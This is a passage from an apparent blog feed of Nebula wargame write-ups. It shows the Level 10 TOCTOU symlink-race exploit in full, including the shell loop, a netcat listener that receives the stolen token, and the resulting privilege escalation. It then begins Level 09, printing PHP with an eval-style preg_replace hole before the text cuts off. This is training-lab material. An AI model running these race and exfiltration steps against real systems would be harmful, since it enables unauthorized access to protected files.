+-rwsr-x--- 1 flag10 level10 7743 Nov 20  2011 flag10
+-rw------- 1 flag10 flag10    37 Nov 20  2011 token
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:/home/flag10$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Only flag10 user account can access the token file, or an another vulnerable SUID applications like flag10 elf (SUID permissions: -rwsr-x—). Let’s take a look at our source code.&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;access&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;R_OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This tells all everything about this level. From the man page (level10@nebula:/home/flag10$ man access):&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;access() checks whether the calling process can access the file path‐name.&lt;/li&gt;
+  &lt;li&gt;The check is done using the calling process’s real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Also inside this IF statement we have:&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;ffd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_RDONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;⇒ In other words this is a a time-of-use to time-of-check or TOCTOU bug (https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use).&lt;/p&gt;
+
+&lt;p&gt;⇒ If we can swap out the file between the time-of-check and the time-of-use, we should be able to send token.&lt;/p&gt;
+
+&lt;p&gt;⇒ Race condition! Let’s try!&lt;/p&gt;
+
+&lt;p&gt;Nebula system:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:/home/flag10$&lt;/span&gt; nano /tmp/token
+&lt;span class=&quot;gp&quot;&gt;level10@nebula:/home/flag10$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/token
+&lt;span class=&quot;go&quot;&gt;Here I have full access.
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:/home/flag10$&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;Personal system:
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;root@yourcomputer:~$&lt;/span&gt; nc &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 18211
+&lt;span class=&quot;go&quot;&gt;Nebula system:
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:/home/flag10$&lt;/span&gt; ./flag10 /tmp/token 192.168.56.1
+&lt;span class=&quot;go&quot;&gt;Connecting to 192.168.56.1:18211 .. Connected!
+Sending file .. wrote file!
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:/home/flag10$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Personal system:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@yourcomputer:~$&lt;/span&gt; nc &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 18211
+&lt;span class=&quot;go&quot;&gt;.oO Oo.
+Here I have full access.
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;⇒ If I have access to my token file then I can get my token.&lt;/p&gt;
+
+&lt;p&gt;Hmmm. Do you remember our friendly command “ln”? Is there enough delay between our link and our access permissions? While true?&lt;/p&gt;
+
+&lt;p&gt;Personal system:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@yourcomputer:~$&lt;/span&gt; nc &lt;span class=&quot;nt&quot;&gt;-lk&lt;/span&gt; 18211
+&lt;span class=&quot;go&quot;&gt;&quot;k&quot; for &quot;non-stop listening&quot;.
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nebula system (terminal 1):&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
+&lt;span class=&quot;gp&quot;&gt;level10@nebula:/tmp$&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sf&lt;/span&gt; /home/flag10/token &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sf&lt;/span&gt; /tmp/token &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nebula system (terminal 2):&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:/tmp$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/
+&lt;span class=&quot;gp&quot;&gt;level10@nebula:/tmp$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 4
+drwxrwxrwt 4 root    root    120 Nov  6 14:13 .
+drwxr-xr-x 1 root    root    220 Nov  6 13:24 ..
+drwxrwxrwt 2 root    root     40 Nov  6 13:24 .ICE-unix
+drwxrwxrwt 2 root    root     40 Nov  6 13:24 .X11-unix
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;lrwxrwxrwx 1 level10 level10  18 Nov  6 14:13 test -&amp;gt;&lt;/span&gt; /home/flag10/token
+&lt;span class=&quot;go&quot;&gt;-rw-rw-r-- 1 level10 level10  25 Nov  6 13:46 token
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:/tmp$&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; /home/flag10/flag10 /tmp/token 192.168.56.1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;Connecting to 192.168.56.1:18211 .. Connected!
+Sending file .. wrote file!
+Connecting to 192.168.56.1:18211 .. Connected!
+Sending file .. wrote file!
+Connecting to 192.168.56.1:18211 .. Connected!
+Sending file .. wrote file!
+Connecting to 192.168.56.1:18211 .. Connected!
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt; sniiiiiiiiip &amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Personal system:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@yourcomputer:~$&lt;/span&gt; nc &lt;span class=&quot;nt&quot;&gt;-lk&lt;/span&gt; 18211
+&lt;span class=&quot;go&quot;&gt;.oO Oo.
+Here I have full access.
+.oO Oo.
+Here I have full access.
+.oO Oo.
+Here I have full access.
+.oO Oo.
+Here I have full access.
+.oO Oo.
+Here I have full access.
+.oO Oo.
+Here I have full access.
+.oO Oo.
+Here I have full access.
+.oO Oo.
+Here I have full access.
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt; sniiiiip &amp;gt;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And for the big final of our race condition:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level10@nebula:~$&lt;/span&gt; ssh flag10@localhost
+&lt;span class=&quot;go&quot;&gt;The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
+
+      _   __     __          __
+     / | / /__  / /_  __  __/ /___ _
+    /  |/ / _ \/ __ \/ / / / / __ `/
+   / /|  /  __/ /_/ / /_/ / / /_/ /
+  /_/ |_/\___/_.___/\__,_/_/\__,_/
+
+    exploit-exercises.com/nebula
+
+
+For level descriptions, please see the above URL.
+
+To log in, use the username of &quot;levelXX&quot; and password &quot;levelXX&quot;, where
+XX is the level number.
+
+Currently there are 20 levels (00 - 19).
+
+
+flag10@localhost's password:
+Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+New release '12.04 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;The programs included with the Ubuntu system are free software;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;flag10@nebula:~$&lt;/span&gt; getflag
+&lt;span class=&quot;go&quot;&gt;You have successfully executed getflag on a target account
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;flag10@nebula:~$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+        <author>
+            <name>Lucian Nitescu</name>
+          
+          
+        </author>
+      
+
+      
+        <category term="nebula" />
+      
+        <category term="writeups" />
+      
+
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
+  
+  
+  
+    <entry>
+      
+      <title type="html">Exploit Exercises: Nebula Level 09</title>
+      
+      
+      <link href="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-09/" rel="alternate" type="text/html" title="Exploit Exercises: Nebula Level 09" />
+      
+      <published>2018-07-16T15:49:00-03:00</published>
+      <updated>2018-07-16T15:49:00-03:00</updated>
+      <id>https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-09</id>
+      <content type="html" xml:base="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-09/">&lt;p&gt;&lt;img src=&quot;/uploads/Screenshot%20from%202018-07-16%2000-20-16.png&quot; alt=&quot;Image of Nebula Terminal&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There’s a C setuid wrapper for some vulnerable PHP code…
+To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.&lt;/p&gt;
+
+&lt;h3 id=&quot;source-code&quot;&gt;Source code&lt;/h3&gt;
+
+&lt;p&gt;(level9.php)&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;spam&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$email&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/\./&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; dot &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$email&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/@/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; AT &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;markup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$use_me&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/(\[email (.*)\])/e&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;spam(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/\[/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/\]/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;markup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;Contents of the flag09 user account home folder:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/flag09/
+&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 13
+drwxr-x--- 2 flag09 level09   98 Nov 20  2011 .
+drwxr-xr-x 1 root   root      80 Aug 27  2012 ..
+-rw-r--r-- 1 flag09 flag09   220 May 18  2011 .bash_logout
+-rw-r--r-- 1 flag09 flag09  3353 May 18  2011 .bashrc
+-rw-r--r-- 1 flag09 flag09   675 May 18  2011 .profile
+-rwsr-x--- 1 flag09 level09 7240 Nov 20  2011 flag09
+-rw-r--r-- 1 root   root     491 Nov 20  2011 flag09.php
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now let’s take a peek into those files!&lt;/p&gt;
+
+&lt;p&gt;flag09:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; file flag09
+&lt;span class=&quot;go&quot;&gt;flag09: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; ./flag09
+&lt;span class=&quot;go&quot;&gt;PHP Notice:  Undefined offset: 1 in /home/flag09/flag09.php on line 22
+PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
+PHP Warning:  file_get_contents(): Filename cannot be empty in /home/flag09/flag09.php on line 13
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;flag09.php:
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level09@nebula:/home/flag09$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag09.php
+&lt;span class=&quot;go&quot;&gt;&amp;lt;?php
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;function spam($&lt;/span&gt;email&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;{
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;	$&lt;/span&gt;email &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; preg_replace&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot; dot &quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$email&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;	$&lt;/span&gt;email &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; preg_replace&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/@/&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot; AT &quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$email&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;	return $&lt;/span&gt;email&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;}
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;function markup($&lt;/span&gt;filename, &lt;span class=&quot;nv&quot;&gt;$use_me&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;{
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;	$&lt;/span&gt;contents &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; file_get_contents&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;	$&lt;/span&gt;contents &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; preg_replace&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;email (.*)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)/e&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;spam(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;	$&lt;/span&gt;contents &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; preg_replace&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;	$&lt;/span&gt;contents &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; preg_replace&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$contents&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;	return $&lt;/span&gt;contents&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;}
+
